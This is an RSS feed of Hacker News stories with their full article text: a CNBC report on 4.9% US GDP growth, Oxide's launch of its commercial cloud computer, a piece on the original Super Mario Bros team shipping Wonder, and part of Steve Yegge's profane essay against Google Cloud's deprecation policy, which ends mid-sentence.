<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 26 Oct 2023 15:00:08 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[U.S. GDP grew at a 4.9% annual pace in the third quarter, better than expected (126 pts)]]></title>
            <link>https://www.cnbc.com/2023/10/26/us-gdp-grew-at-a-4point9percent-annual-pace-in-the-third-quarter-better-than-expected.html</link>
            <guid>38025177</guid>
            <pubDate>Thu, 26 Oct 2023 13:23:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2023/10/26/us-gdp-grew-at-a-4point9percent-annual-pace-in-the-third-quarter-better-than-expected.html">https://www.cnbc.com/2023/10/26/us-gdp-grew-at-a-4point9percent-annual-pace-in-the-third-quarter-better-than-expected.html</a>, See on <a href="https://news.ycombinator.com/item?id=38025177">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>The U.S. economy grew even faster than expected in the third quarter, buoyed by a strong consumer in spite of higher interest rates, ongoing inflation pressures, and a variety of other domestic and global headwinds.</p><p>Gross domestic product, a measure of all goods and services produced in the U.S., rose at a seasonally adjusted 4.9% annualized pace in the July-through-September period, up from an unrevised 2.1% pace in the second quarter, the <a href="https://www.bea.gov/news/2023/gross-domestic-product-third-quarter-2023-advance-estimate" target="_blank">Commerce Department reported</a> Thursday.. Economists surveyed by Dow Jones had been looking for a 4.7% acceleration in GDP, which also is adjusted for inflation.</p></div><div><p>The sharp increase came due to contributions from consumer spending, increased inventories, exports, residential investment and government spending.</p><p>Consumer spending, as measured by personal consumption expenditures, increased 4% for the quarter after rising just 0.8% in Q2, and was responsible for 2.7 percentage points of the total GDP increase. Inventories contributed 1.3 percentage points. Gross private domestic investment surged 8.4% and government spending and investment jumped 4.6%.</p><p>Spending at the consumer level split fairly evenly between goods and services, with the two measures up 4.8% and 3.6%, respectively.</p><p>The GDP increase marked the biggest gain since the fourth quarter of 2021.</p><p><a href="https://www.cnbc.com/2023/10/25/stock-market-today-live-updates.html">Markets reacted little</a> to the news, with stocks mixed in early trading and Treasury yields mostly lower.</p><p>"This report confirmed what we already knew: The consumer went on a shopping spree in the third quarter," said Michael Arone, chief investment strategist for U.S. SPDR Business at State Street Global Advisors. "I don't think anything in this report changes the outlook for monetary policy. That's why I don't think you're seeing an overreaction from markets."</p><p>While the report could give the Federal Reserve some impetus to keep policy tight, traders were still pricing in no chance of an interest rate hike when the central bank meets next week, according to CME Group data. Futures pricing pointed to just a 27% chance of an increase at the December meeting following the GDP release.</p><p>"Investors should not be surprised that the consumer was spending in the final months of the summer," said Jeffrey Roach, chief economist at LPL Financial. "The real question is if the trend can continue in the coming quarters, and we think not."</p><p>In other economic news Thursday, the <a href="https://www.dol.gov/ui/data.pdf" target="_blank">Labor Department reported</a> that jobless claims totaled 210,000 for the week ended Oct. 21, up 10,000 from the previous period and slightly ahead of the Dow Jones estimate for 207,000. Also, <a href="https://www.census.gov/manufacturing/m3/adv/pdf/durgd.pdf" target="_blank">durable goods orders</a> increased 4.7% in September, well ahead of the 0.1% gain in August and the 2% forecast, according to the Commerce Department.</p><p>At a time when many economists had thought the U.S. would be in the midst of at least a shallow recession, growth has kept pace due to consumer spending that has exceeded all expectations. The consumer was responsible for about 68% of GDP in Q3.</p><p>While the U.S. has proven resilient to the various challenges, most economists expect growth to slow considerably in the coming months. However, they generally think the U.S. can skirt a recession absent any other unforeseen shocks.</p><p>"Going forward, the consumer's not going to spend at the same rate, the government is not going to spend at the same rate, and businesses seem to be slowing down their spending as well," Arone said. "This suggests this might be the peak GDP figure, at least in the next few quarters."</p><p>Even with Covid-era government transfer payments running out, spending has been strong as households draw down savings and ramp up credit card balances. The personal saving rate declined to 3.8% in the third quarter, compared to 5.2% in the previous period. Also, real after-tax income fell 1% in the quarter after increasing 3.5% in Q2.</p><p>The GDP gains also come despite the Federal Reserve not only raising rates at the fastest clip since the early 1980s but also vowing to keep rates high until inflation comes back to acceptable levels. Price increases have been running well ahead of the central bank's 2% annual target, though the rate of inflation at least has ebbed in recent months.</p><p>The chain-weighted price index, which takes into accounts changes in consumer shopping patterns to gauge inflation, rose 3.5% for the quarter, up from 1.7% in Q2 and higher than the Dow Jones estimate for 2.5%.</p><p>"The bottom line for the Federal Reserve is that no recession is in sight, and policymakers can be content in the knowledge that they can keep interest rates higher for longer, without triggering a meltdown in the U.S. economy," said Matthew Ryan, head of market strategy at Ebury, a global financial services firm. "We don't think that this impressive GDP data will be enough to encourage the Fed to deliver another rate increase, though we do at least believe that the first cut is a long way off."</p><p>Along with rates and inflation, consumers have been dealing with a variety of other issues.</p><p>The resumption of student loan payments is expected to take a bite out of household budgets, while elevated gas prices and a wobbly stock market are hitting confidence levels. Geopolitical tensions also pose potential headaches, with <a href="https://www.cnbc.com/2023/10/26/israel-hamas-war-updates-and-latest-news-on-gaza-conflict.html">fighting between Israel and Hamas</a> and the war in Ukraine posing substantial uncertainties about the future.</p><p><em><strong>Don't miss these CNBC PRO stories:</strong></em></p><ul><li><a href="https://www.cnbc.com/2023/10/16/want-to-retire-in-5-years-heres-how-to-invest-for-it-according-to-the-pros.html"><em>Want to retire in 5 years? Here's how to invest for it, according to the pros</em></a></li><li><a href="https://www.cnbc.com/2023/10/16/morgan-stanley-says-the-average-stock-is-breaking-down-sp-500-to-fall-to-3900-by-year-end-.html"><em>Morgan Stanley says the average stock is breaking down, S&amp;P 500 to fall to 3,900 by year-end</em></a></li><li><a href="https://www.cnbc.com/2023/10/15/this-highly-profitable-industry-is-booming-as-the-population-ages.html"><em>This highly profitable industry is booming as the population ages</em></a></li><li><a href="https://www.cnbc.com/2023/10/20/the-chip-stock-is-getting-a-ton-of-love-from-wall-street-and-its-not-nvidia.html"><em>This chip stock is getting a ton of love from Wall Street, and it's not Nvidia</em></a></li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Oxide: The Cloud Computer (526 pts)]]></title>
            <link>https://oxide.computer/blog/the-cloud-computer</link>
            <guid>38023891</guid>
            <pubDate>Thu, 26 Oct 2023 10:43:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://oxide.computer/blog/the-cloud-computer">https://oxide.computer/blog/the-cloud-computer</a>, See on <a href="https://news.ycombinator.com/item?id=38023891">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><div id="preamble"><p>Today we are announcing the general availability of the world’s first
commercial cloud computer — along with
<a href="https://oxide.computer/blog/oxide-unveils-the-worlds-first-commercial-cloud-computer">our $44M Series A financing</a>.</p><p>From the outset at Oxide, and as I outlined in
<a href="https://www.youtube.com/watch?v=vvZA9n3e5pc">my 2020 Stanford talk</a>,
we have had three core beliefs as a company:</p><div><ol><li><p>Cloud computing is the future of all computing infrastructure.</p></li><li><p>The computer that runs the cloud should be able to be <strong>purchased</strong> and not
merely rented.</p></li><li><p>Building a cloud computer necessitates a rack-level approach — and the
co-design of both hardware and software.</p></li></ol></div><p>Of these beliefs, the first is not at all controversial: the agility,
flexibility, and scalability of cloud computing have been indisputably
essential for many of the services that we depend on in the modern economy.</p><p>The degree that the second belief is controversial, however, depends on who you
are:  for those that are already running on premises due to security,
regulatory, economic, or latency reasons, it is self-evident that computers
should be able to be purchased and not merely rented.  But to others, this has
been more of a revelation — and since we started Oxide, we have found more and
more people realize that the rental-only model for the cloud is not
sustainable.  Friends love to tag us on links to
<a href="https://a16z.com/the-cost-of-cloud-a-trillion-dollar-paradox/">VC thinkpieces</a>,
<a href="https://world.hey.com/dhh/why-we-re-leaving-the-cloud-654b47e0">CTO rants</a>, or
<a href="https://www.idc.com/getdoc.jsp?containerId=IDC_P20184">analyst reports on
industry trends</a> — and we love people thinking of us, of course (even when
being tagged for the dozenth time!) — but the only surprise is how surprising
it continues to be for some folks.</p><p>The third belief — that the development of a cloud computer necessitates
rack-scale design of both hardware <em>and</em> software — may seem iconoclastic to
those who think only in terms of software, but it is in fact not controversial
among technologists: as computing pioneer Alan Kay famously observed, "people
who are really serious about software should make their own hardware." This is
especially true in cloud computing, where the large public cloud companies
have long ago come to the conclusion that they needed to be designing their
own holistic systems.  But if this isn’t controversial, why hasn’t there been
a cloud computer before Oxide’s?  First, because <strong>it’s big</strong>:  to meaningfully
build a cloud computer, one must break out of the shackles of the 1U or 2U
server, and really think about the rack as the unit of design.  Second,
it hasn’t been done because <strong>it’s hard</strong>:  co-designing hardware and
software that spans compute, networking, and storage requires building an
extraordinary team across disparate disciplines, coupling deep expertise with
a strong sense of versatility, teamwork, and empathy.  And the team isn’t
enough by itself: it also needs courage, resilience, and (especially) time.</p><p>So the biggest question when we set out was not "is the market there?" or "is
this the right way to do it?", but rather <strong>could we pull this off?</strong></p></div><div><h2 data-sectnum="">Pulling it off</h2><div><p>We have indeed
<a href="https://oxide.computer/product/specifications">pulled it off</a> — and it’s been a
wild ride!  While we have talked about the trek quite a bit on our podcast,
<a href="https://oxide.computer/podcasts/oxide-and-friends">Oxide and Friends</a> (and
specifically, <a href="https://oxide.computer/podcasts/oxide-and-friends/1411249">Steve
and I recently answered questions about the rack</a>), our general availability
is a good opportunity to reflect on some of the first impressions that the
Oxide cloud computer has made upon those who have seen it.</p><div><h3 data-sectnum="..">"Where are all the boxes?"</h3><div><p>The traditional rack-and-stack approach starts with a sea of boxes arriving
with servers, racks, cabling, etc.  This amounts to a literal
<a href="https://en.wikipedia.org/wiki/Kit_car">kit car</a> approach — and it starts with
tedious, dusty, de-boxing.  But the Oxide rack ships with everything installed
and comes in just <strong>one</strong> box — a crate that is
<a href="https://oxide.computer/podcasts/oxide-and-friends/1417751">its own feat of
engineering</a>.  All of this serves to dramatically reduce the latency from
equipment arrival to power on and first provision — from weeks and months to
days or even hours.</p></div></div><div><h3 data-sectnum="..">"Is it on?"</h3><div><p>We knew at the outset that rack-level design would afford us the ability to
change the geometry of compute sleds — that we would get higher density in the
rack by trading horizontal real estate for vertical.  We knew, too, that we
were choosing to use 80mm fans for their ability to move more air much more
efficiently — so much so that we leveraged
<a href="https://oxide.computer/blog/navigating-todays-supply-chain-challenges">our
approach to the supply chain</a> to partner with Sanyo Denki (our fan provider) to
lower the minimum speed of the fans from 5K RPM to the 2K RPM that we needed.
But adding it up, the Oxide rack has a surprising aesthetic attribute:  <strong>it is
whisper quiet.</strong>  To those accustomed to screaming servers, this is so
unexpected that when we were
<a href="https://oxide.computer/podcasts/oxide-and-friends/1200412">getting FCC
compliance</a>, the engineer running the test sheepishly asked us if we were sure
the rack was on — when it was dissipating 15 kW!  That the rack is quiet wasn’t
really deliberate (and we are frankly much more interested in the often hidden
power draw that blaring fan noise represents), but it does viscerally embody
much of the Oxide differentiation with respect to both rack-level design and
approach to the supply chain.</p></div></div><div><h3 data-sectnum="..">"Where are the cables?"</h3><div><p>Anyone accustomed to a datacenter will note the missing mass of cold-aisle
cabling that one typically sees at the front of a rack.  But moving to the back
of the rack reveals only a <a href="https://en.wikipedia.org/wiki/Busbar">DC busbar</a> and
a tight, cabled backplane.  This represents one of the bigger bets we made:
<a href="https://oxide.computer/podcasts/oxide-and-friends/1281318">we blindmated
networking</a>.  This was mechanically tricky, but the payoff is huge: capacity
can be added to the Oxide cloud computer simply by snapping in a new compute
sled — nothing to be cabled whatsoever!  This is a domain in which we have
leapfrogged the hyperscalers, who (for their own legacy reasons) don’t do it
this way.  This can be jarring to veteran technologists.  As one exclaimed upon
seeing the rack last week, "I am both surprised and delighted!" (Or rather:
a very profane variant of that sentiment.)</p></div></div><div><h3 data-sectnum="..">"You did your own switch too?!"</h3><div><p>When we first started the company, one of our biggest technical quandaries was
what to do about the switch.  At some level, both paths seemed untenable:  we
knew from our own experience that integrating with third-party switches would
lead to exactly the kind of integration pain for customers that we sought to
alleviate — but it also seemed outrageously ambitious to do our own switch in
addition to everything else we were doing.  But as we have many times over the
course of Oxide, we opted for the steeper path in the name of saving our
customers grief, choosing to
<a href="https://oxide.computer/podcasts/oxide-and-friends/838572">build our own
switch</a>.  If it has to be said,
<a href="https://oxide.computer/podcasts/oxide-and-friends/1008496">getting it working
isn’t easy</a>!  And of course, building the switch is insufficient: we also
needed to <a href="https://oxide.computer/podcasts/oxide-and-friends/1231631">build our
own networking software</a> — to say nothing of the
<a href="https://oxide.computer/podcasts/oxide-and-friends/1333581">management network</a>
required to be able to manage compute sleds when they’re powered off.</p></div></div><div><h3 data-sectnum="..">"Wait, <em>that’s</em> part of it?!"</h3><div><p>It’s one thing to say that all of the software that one needs to operate the
cloud computer is built in — but it’s another to actually see what that
software includes.  And for many, it’s seeing the
<a href="https://github.com/oxidecomputer/console">Oxide web console</a> (or its
<a href="https://oxide-console-preview.vercel.app/">live demo</a>!) that really drives the
message home:  yes, <strong>all</strong> of the software is included.  And because the
<a href="https://oxide.computer/podcasts/oxide-and-friends/1426644">console
implementation</a> is built on the <a href="https://docs.oxide.computer/">public API</a>,
everything that one can do in the console for the Oxide rack is also available
via CLI and API — a concrete manifestation of our
<a href="https://www.youtube.com/watch?v=EmSjZbSzA3A">code-as-contract</a> approach.</p></div></div><div><h3 data-sectnum="..">"And there’s no separate licensing?"</h3><div><p>One common source of pain for users of on-prem infrastructure has been license
management: financial pain due to over-paying and under-utilizing, and
operational pain in the navigation of different license terms, different
expiration dates, unpredictable dependencies, and
<a href="https://www.theregister.com/2022/05/31/vmware_broadcom_acquisition_customer_reaction/">uncertain
vendor futures</a>.  From the beginning we knew that we wanted to deliver a
delightful, integrated experience:  we believe that cloud computers should come
complete with all system software built-in, and with no additional licensing to
manage or to pay for.  Bug fixes and new features are always only an update
away and do not require a multi-departmental discussion to determine value and
budget.</p></div></div><div><h3 data-sectnum="..">"It’s all open source?"</h3><div><p>While the software is an essential part of the Oxide cloud computer, what we
sell is in fact the computer.  As <a href="https://www.youtube.com/watch?v=um5bC20NTQ0">a
champion of open source</a>, this allows Oxide a particularly straightforward open
source strategy:  <a href="https://github.com/oxidecomputer/">our software is all open</a>.
So you don’t need to worry about hinky open core models or relicensing
surprises.  And from a user perspective, you are assured levels of transparency
that you don’t get in the public cloud — let alone the proprietary on-prem
world.</p></div></div></div></div><div><h2 data-sectnum="">Getting your own first impression</h2><div><p>We’re really excited to have the first commercial cloud computer — and for
it to be generally available!  If you yourself are interested, we look
forward to it making its first impression on you —
<a href="https://oxide.computer/sales">reach out to us</a>!</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[People who made the original Super Mario Bros shipped Wonder 38 years later (109 pts)]]></title>
            <link>https://www.gamesradar.com/5-people-made-the-original-super-mario-bros-all-of-them-were-still-at-nintendo-to-ship-wonder-38-years-later/</link>
            <guid>38023580</guid>
            <pubDate>Thu, 26 Oct 2023 09:45:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.gamesradar.com/5-people-made-the-original-super-mario-bros-all-of-them-were-still-at-nintendo-to-ship-wonder-38-years-later/">https://www.gamesradar.com/5-people-made-the-original-super-mario-bros-all-of-them-were-still-at-nintendo-to-ship-wonder-38-years-later/</a>, See on <a href="https://news.ycombinator.com/item?id=38023580">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-body">
<p>The original <a href="https://www.gamesradar.com/uk/tag/super-mario/" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.gamesradar.com/uk/tag/super-mario/">Super Mario</a> Bros. on NES was made by a team of five people, and it seems every single one of them is still at Nintendo and was credited on <a href="https://www.gamesradar.com/super-mario-bros-wonder-guide/" data-before-rewrite-localise="https://www.gamesradar.com/super-mario-bros-wonder-guide/">Super Mario Bros. Wonder</a>.</p><p>Back in the NES days, video games were small enough to be developed by absolutely tiny teams. Super Mario Bros., released in Japan in 1983, was made by just five people: director Shigeru Miyamoto, assistant director Takashi Tezuka, programmers Toshihiko Nakago and Kazuaki Morita, and musician Koji Kondo.</p><p>In an incredible feat of game industry continuity, all five of them are still credited on Super Mario Bros. Wonder. Miyamoto served as supervisor, with Tezuka as producer, Nakago as a special level design advisor, and Kondo as sound director. Morita, meanwhile, is in the special thanks section. With four of the five original devs serving in major supervisory roles 38 years later, this might just be the most incredible piece of developer continuity in gaming history.</p><div><blockquote data-lang="en"><p lang="en" dir="ltr">Oh, and even though they've been doing it for nearly 40 years, sounds like that's not stopping them from adapting to the times: pic.twitter.com/3WTDQkw7WJ<a href="https://twitter.com/maxnichols/status/1716316684506837256" data-url="https://twitter.com/maxnichols/status/1716316684506837256">October 23, 2023</a></p></blockquote><p><span role="button" tabindex="0" aria-label="See more">See more</span></p></div><p>"The people who are making Mario have been doing it in an unbroken streak since most of the creative leadership at other companies today were kids," as <a href="https://www.gamesradar.com/uk/tag/bungie/" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.gamesradar.com/uk/tag/bungie/">Bungie</a>'s Max Nichols notes on <a href="https://twitter.com/maxnichols/status/1716315414345678986" target="_blank" data-url="https://twitter.com/maxnichols/status/1716315414345678986">Twitter</a>. Nichols' tweets put this bit of trivia on my radar, and since then the full Wonder credits have been published on <a href="https://www.mobygames.com/game/210462/super-mario-bros-wonder/credits/switch/" target="_blank" data-url="https://www.mobygames.com/game/210462/super-mario-bros-wonder/credits/switch/">MobyGames</a>, confirming the full roles of all five of those original devs.</p><p>Of course, Wonder was made by a much larger team than just those original developers, including some less familiar names in key roles. Most notable is director Shiro Mouri, who despite being at Nintendo for over 25 years, only recently graduated to lead a full, original game of his own. He'd previously served as programming director on New Super Mario Bros. U and main director on the Switch port of that same game.</p><p>The game industry is notoriously volatile, and even among Japanese studios it's extremely uncommon to see legendary game designers continue to work on the series they made famous after this many years. As you can see in our <a href="https://www.gamesradar.com/super-mario-bros-wonder-review/" data-before-rewrite-localise="https://www.gamesradar.com/super-mario-bros-wonder-review/">Super Mario Bros. Wonder review</a>, it seems those old names haven't lost their touch, either.</p><p><em>There's a reason the </em><a href="https://www.gamesradar.com/best-mario-games/" data-before-rewrite-localise="https://www.gamesradar.com/best-mario-games/"><em>best Mario games</em></a><em> have stood the test of time better than most of their contemporaries.</em></p>
</div><div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent"><section><p>Weekly digests, tales from the communities you love, and more</p></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Dear Google Cloud: Your Deprecation Policy Is Killing You (2020) (117 pts)]]></title>
            <link>https://steve-yegge.medium.com/dear-google-cloud-your-deprecation-policy-is-killing-you-ee7525dc05dc</link>
            <guid>38023392</guid>
            <pubDate>Thu, 26 Oct 2023 09:09:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://steve-yegge.medium.com/dear-google-cloud-your-deprecation-policy-is-killing-you-ee7525dc05dc">https://steve-yegge.medium.com/dear-google-cloud-your-deprecation-policy-is-killing-you-ee7525dc05dc</a>, See on <a href="https://news.ycombinator.com/item?id=38023392">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><a rel="noopener follow" href="https://steve-yegge.medium.com/?source=post_page-----ee7525dc05dc--------------------------------"><div aria-hidden="false"><p><img alt="Steve Yegge" src="https://miro.medium.com/v2/resize:fill:88:88/1*OrBdZ2GUUicWcT6x8KSYZg.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"></p></div></a></div><p id="a428">God dammit, I didn’t want to blog again. I have so much stuff to do. Blogging takes time and energy and creativity that I could be putting to good use: my novels, my <a href="https://www.youtube.com/watch?v=VK244wAQ3Qo" rel="noopener ugc nofollow" target="_blank">music</a>, my game, and so on. But you get me riled enough, and I have to blog.</p><p id="983a">Let’s get this over with, then.</p><p id="b6e0">I’ll begin with a small but enlightening story from my early days at Google. For the record, I know I’ve said some perhaps unkind things about Google lately, because it’s frustrating when your corporate alma mater makes incompetent business decisions on the regular. But Google’s internal infrastructure is truly extraordinary, and you could argue that there is still none better today. The people who built Google were far better engineers than I will <em>ever</em> be, as this anecdote should serve to illustrate.</p><p id="2586">First a wee bit of background: Google has a storage technology called <a href="https://en.wikipedia.org/wiki/Bigtable" rel="noopener ugc nofollow" target="_blank">Bigtable</a>. Bigtable was a remarkable technical achievement, being one of the first (if not <em>the</em> first) “infinitely scalable” key-value stores: the beginning of NoSQL, basically. These days Bigtable still holds up well in the rather crowded space of K/V stores, but back in the day (2005) it was breathtakingly cool.</p><p id="2f06">One fun bit of trivia about Bigtable is that they had these internal control-plane entities (as part of the implementation) called tablet servers, which had large indexes, and at some point they became a scaling bottleneck. So the Bigtable engineers scratched their heads over how to make it scale, and realized that they could replace the tablet servers with Bigtables to unblock the scaling. So Bigtable is part of its own implementation. It’s Bigtables all the way down.</p><p id="0205">Another cool bit of trivia is that for a time, Bigtables became popular and ubiquitous inside Google and everyone and their dog had one. So at one Friday’s TGIF all-hands, Larry Page casually asked in passing, “Why do we have more than one Bigtable? Why isn’t there just one?” Because in theory, one Bigtable should have sufficed for all Google’s storage needs. Of course they never did migrate to just one, for practical software engineering reasons (e.g. blast radius), but the theory was interesting. One database for the whole universe. <em>(Side note: Anyone know if Sable does this at Amazon?)</em></p><p id="04cd">Anyway, here’s my story, to get us started on my rant.</p><p id="fceb">One day, after I’d been working at Google for just over 2 years, I got an email from the Bigtable engineering team. It said something along the lines of:</p><p id="d48c"><em>Dear Steve,</em></p><p id="0bf7"><em>Greetings from the Bigtable team. We wanted to let you know that you are running a very, very old Bigtable binary in the [some data center name] data center. That version is no longer supported, and we would like to work with you to help you upgrade to the latest version.</em></p><p id="02a5"><em>Please let us know if you can schedule some time to work with us on this.</em></p><p id="0770"><em>Best,</em></p><p id="b3af"><em>Bigtable Team</em></p><p id="4a24">You get a lot of email at Google, as you can imagine, and when I glanced at this one, this is what I first perceived it to be saying:</p><p id="03d2"><em>Dear </em><strong><em>RECIPIENT</em></strong><em>,</em></p><p id="f81e"><em>Greetings from Some Team. We wanted to let you know blah blah blah blah blah blah blah. Blah blah blah blah blah blah blah BLAH, and blah blah blah blah immediately.</em></p><p id="ead9"><em>Please let us know if you can schedule some of your precious time to blah blah blah.</em></p><p id="702a"><em>Best,</em></p><p id="7355"><em>Some Team</em></p><p id="5b9c">I almost deleted it on the spot, but there was this lingering, nagging feeling that it didn’t <em>quite</em> feel like a form letter, even though it <em>obviously</em> wasn’t for me, since I didn’t have a Bigtable.</p><p id="e46e">But it was weird.</p><p id="d293">For the rest of the day, as I was alternating between working and deciding which species of gummy shark to try next in the micro-kitchens, of which there were at least three close enough to hit from my seat with a well-aimed biscuit, I thought about that email with a growing sense of mild anxiety.</p><p id="9431">They had used my name specifically. And the email had been sent to my email address and nobody else’s, and not by cc: or bcc:. The tone was very personal and pointed. Maybe it was some sort of mistake?</p><p id="19bc">Curiosity finally got the better of me, and I went to look at my Borg console in the data center they’d mentioned in the email.</p><p id="8645">And sure enough, I was running a Bigtable there. Whaaaaat? I looked at its contents, and lo! It was from the Bigtable codelab I’d run back in my first week as a Noogler, in June 2005. The codelab had you fire up a Bigtable so you could programmatically write some values to it, and I had apparently never shut it down afterwards. It was still running there, over 2 years later.</p><p id="9f7b">There are several remarkable aspects to this story. One is that running a Bigtable was so inconsequential to Google’s scale that it took 2 years before anyone even noticed it, and even then, only because the version was old. As a point of comparison, I considered using <a href="https://cloud.google.com/bigtable" rel="noopener ugc nofollow" target="_blank">Google Cloud Bigtable</a> for my online game, but it cost (at the time) an estimated $16,000/year for an <em>empty</em> Bigtable on GCP. I’m not saying they’re gouging you, but in my own personal opinion, that feels like a lot of money for an empty fucking database.</p><p id="b925">Another remarkable aspect is that <em>it was still running after 2 years</em>. WTF? Data centers come and go; they experience outages, they undergo routine maintenance, they change all the time. Hardware gets upgraded, network switches swap out, everything is constantly being improved. How the heck were they able to keep my software running for 2 years in the face of all that change? It may feel like a humdrum achievement in 2020, but in 2005–2007 it was pretty impressive.</p><p id="73e4">And then there is in my opinion the most remarkable aspect of all, which is that an unrelated engineering team in some other state was reaching out to <em>me</em>, the owner of some tiny mostly-empty Bigtable instance which had had <em>zero traffic</em> for the past 2 years, asking if they could help me upgrade.</p><p id="d0bb">I thanked them and shut it down and life went on. But I still think about that letter, thirteen years later. Because I sometimes get similar letters from the Google Cloud Platform. They look like this:</p><p id="c068"><em>Dear Google Cloud Platform User,</em></p><p id="ec5e"><em>We are writing to remind you that we are sunsetting [Important Service you are using] as of August 2020, after which you will not be able to perform any updates or upgrades on your instances. We encourage you to upgrade to the latest version, which is in Beta, has no documentation, no migration path, and which we have kindly deprecated in advance for you</em>.</p><p id="9bff"><em>We are committed to ensuring that all developers of Google Cloud Platform are minimally disrupted by this change.</em></p><p id="1d71"><em>Besties Forever,</em></p><p id="b8c9"><em>Google Cloud Platform</em></p><p id="191d">But I barely skim them, because what they are really saying is:</p><p id="9035"><em>Dear </em><strong><em>RECIPIENT</em></strong><em>,</em></p><p id="63a8"><em>Fuck yooooouuuuuuuu. Fuck you, fuck you, Fuck You. Drop whatever you are doing because it’s not important. What is important is OUR time. It’s costing us time and money to support our shit, and we’re tired of it, so we’re not going to support it anymore. So drop your fucking plans and go start digging through our shitty documentation, begging for scraps on forums, and oh by the way, our new shit is COMPLETELY different from the old shit, because well, we fucked that design up pretty bad, heh, but hey, that’s YOUR problem, not our problem.</em></p><p id="6aa7"><em>We remain committed as always to ensuring everything you write will be unusable within 1 year.</em></p><p id="7d39"><em>Please go fuck yourself,</em></p><p id="589b"><em>Google Cloud Platform</em></p><p id="f3b8">And the thing is, I get these about once a month. It happens so often and so reliably that I have been inexorably pushed <em>away</em> from GCP, towards cloud agnosticism. I no longer take dependencies on their proprietary service offerings, because it actually winds up being less DevOps work, on average, to support open-source systems running on bare VMs, than to try to keep up with Google’s deprecation treadmill.</p><p id="77c1">Before I return to shitting on Google Cloud Platform, because boyo I am nowhere <em>near</em> finished yet, let’s go visit how software engineering works in some other domains. Google engineers pride themselves on their software engineering discipline, and that’s actually what gets them into trouble. Pride is a trap for the unwary, and it has ensnared many a Google team into thinking that their decisions are always right, and that correctness (by some vague fuzzy definition) is more important than customer focus.</p><p id="1b8c">I’m going to pick a few somewhat arbitrary examples from other big software systems, but hopefully you’ll be able to start spotting the pattern everywhere; that pattern being: <strong>Backwards compatibility keeps systems alive and relevant for decades</strong>.</p><p id="c284">Backwards compatibility is a design goal of all successful systems that are designed for <em>open</em> use; that is, implemented as open source, and/or guided by open standards. I feel like I’m stating something that’s so obvious that we should all be awkwardly embarrassed, but no. It’s a political issue, so I need examples.</p><p id="94db">The first system I’ll pick is the oldest: GNU Emacs, which is a sort of hybrid between Windows Notepad, a monolithic-kernel operating system, and the International Space Station. It’s a bit tricky to explain, but in a nutshell, Emacs is a platform written in 1976 (yes, almost half a century ago) for writing software to make you more productive, masquerading as a text editor.</p><p id="6e9d">I use Emacs every single day. Yes, I’m also using IntelliJ every day, and that has grown into a powerful tooling platform in its own right. But writing software extensions for IntelliJ is a much more ambitious and complex undertaking than writing extensions for Emacs. And more importantly, stuff lasts <em>forever</em> on Emacs.</p><p id="673f">I’m still using software that I wrote for Emacs back in 1995. And I’m sure there are people who are still using software they wrote for Emacs from the mid-80s, if not earlier. Every once in a while it might require a minor tweak, but it’s really quite rare. I’m not aware of anything I’ve ever written for Emacs (and I’ve written a lot) that was ever forced into re-architecture.</p><p id="cf77">Emacs does have a deprecation facility called make-obsolete. Emacs’ terminology for fundamental software engineering concepts (like what is a “window”) are often different from the industry conventions, because Emacs invented them long, long ago. The perils of being before your time: Your names are all wrong. But Emacs does indeed have deprecation, called <em>obsolescence</em> in their lingo.</p><p id="2bec">However, the Emacs folks seem to have a different working definition. A different underlying philosophy, if you will.</p><p id="f6c6">In the Emacs world (and in many other domains, some of which we’ll explore below), when they make an API obsolete, they are basically saying: “You really shouldn’t use this approach, because even though it works, it suffers from various deficiencies which we enumerate here. But in the end it’s your call.”</p><p id="cf46">Whereas in the Google world, deprecation means: “We are breaking our commitments to you.” It really does. That’s what it ultimately means. It means they are going to force you to do some work, possibly a large amount of rework, <em>on a regular basis</em>, as punishment for doing what they told you to do originally — as punishment for listening to their glossy marketing on their <a href="https://cloud.google.com/gcp" rel="noopener ugc nofollow" target="_blank">website</a>: Better software. Faster! You do <em>everything</em> they tell you to do, and you launch your application or service, and then, bang, a year or two later it breaks down.</p><p id="9f63">This is like selling you a used car that they know is going to break down in under 1000 miles.</p><p id="4411">These are two very, very different philosophical definitions of “deprecation”. Google’s definition reeks of <a href="https://en.wikipedia.org/wiki/Planned_obsolescence" rel="noopener ugc nofollow" target="_blank">planned obsolescence</a>. I don’t believe that it’s <em>actually</em> planned obsolescence in the same sense that, say, Apple perpetrates. But Google definitely plans to break your stuff, in a roundabout way. I know because I worked there as a software engineer for 12+ years. They have loose internal guidelines about how much backwards compatibility to bake into service offerings, but in the end it’s up to each individual team or service. There are no corporate-level or engineering-level guidelines, and the <em>longest</em> anyone has the courage to recommend, in terms of deprecation cycles, is “try to give your customers 6–12 months to upgrade before you drape them over the barrel.”</p><p id="de52">This is hurting them far more than they realize, and it will continue to hurt them for years to come, because it’s not part of their DNA to care about customers. More on this below.</p><p id="6928">For the moment, I’m going to make the bold assertion that Emacs is successful in large part, perhaps even <em>mostly</em>, because they take backwards compatibility so seriously. In fact, that’s the thesis of this essay. Successful long-lived open systems owe their success to building decades-long micro-communities around <em>extensions/plugins</em>, also known as a <em>marketplace</em>. I’ve ranted about Platforms before, and how important they are, and how Google has never once in their entire corporate history ever really understood what goes into making a successful open Platform, not counting Android or Chrome.</p><p id="33e4">Actually I should talk about Android briefly, because you’re probably thinking, hey, what about Android?</p><p id="c8f6">First, 